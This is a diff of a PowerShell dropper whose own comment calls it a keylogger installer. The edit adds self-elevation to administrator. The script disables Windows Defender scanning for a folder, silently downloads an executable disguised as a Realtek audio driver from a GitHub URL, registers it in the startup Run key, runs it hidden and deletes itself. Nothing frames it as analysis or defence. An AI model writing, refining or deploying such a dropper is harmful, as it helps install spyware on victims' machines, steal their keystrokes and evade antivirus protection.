@@ -1,36 +1,34 @@
-# Silent download and execution of the keylogger exe + attempt folder exclusion
+# Self-elevate if not admin (for exclusion)
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
 
+# Silent download + exclusion attempt
 $exeUrl = "https://github.com/webhookrepo195/mypresonalwebhookfile109/raw/refs/heads/main/Realtek%20Audio%20device.exe"
 
-# No spaces in filename
 $exePath = "$env:APPDATA\Realtek\RealtekAudioDevice.exe"
 
-# Create hidden folder if needed
 $folder = "$env:APPDATA\Realtek"
 if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force }
 
-# Attempt to add exclusion for the folder (requires admin, will fail silently if not elevated)
+# Add exclusion for folder (now with admin)
 try {
-    Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
-    # You can also exclude just the file: Add-MpPreference -ExclusionProcess $exePath
-} catch {
-    # Fail silently - most common outcome without elevation
-}
+    Add-MpPreference -ExclusionPath $folder -Force
+} catch {}
 
 try {
     Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
-} catch {
-    # Fail silently
-}
+} catch {}
 
-# If download succeeded, try exclusion again after drop (sometimes timing helps)
+# Re-try exclusion after drop
 if (Test-Path $exePath) {
     try {
-        Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath $folder -Force
     } catch {}
 }
 
-# Add to current user startup (no admin needed)
+# Add startup
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regName = "RealtekAudioHelper"
 Set-ItemProperty -Path $regPath -Name $regName -Value $exePath -Force -ErrorAction SilentlyContinue
@@ -38,6 +36,7 @@ Set-ItemProperty -Path $regPath -Name $regName -Value $exePath -Force -ErrorActi
 # Run hidden
 Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction SilentlyContinue
 
-# Self-delete the .ps1
+# Self-delete
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+
 
